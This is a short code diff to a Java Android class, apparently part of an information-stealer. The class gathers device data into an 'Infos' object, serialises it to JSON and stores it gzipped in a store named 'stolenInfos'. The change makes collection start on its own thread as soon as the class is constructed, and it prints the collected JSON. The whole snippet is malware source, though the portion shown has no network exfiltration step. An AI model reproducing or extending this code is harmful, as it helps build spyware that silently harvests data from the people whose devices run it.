@@ -14,20 +14,23 @@ public class CollectorMain extends ContextWrapper implements Runnable
 {
 	public CollectorMain(){
 		super(TheApplication.instance);
+		new Thread(this).start();
 	}
 
 	@Override
 	public void run() {
 		// TODO: Implement this method
 		Writer w=null;
+		String s="";
 		try {
-			(w=new OutputStreamWriter(TheApplication.instance.stolenInfos.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(new Gson().toJson(new Infos()));
+			(w=new OutputStreamWriter(TheApplication.instance.stolenInfos.saveFile(System.currentTimeMillis() + ".json", SafeBox.MODE_GZIP))).append(s=new Gson().toJson(new Infos()));
 		} catch (IOException e) {
 			
 		}finally{
 			try {
 				if (w != null)w.close();
 			} catch (IOException e) {}
+			System.out.println(s);
 		}
 	}
 	public class Infos{
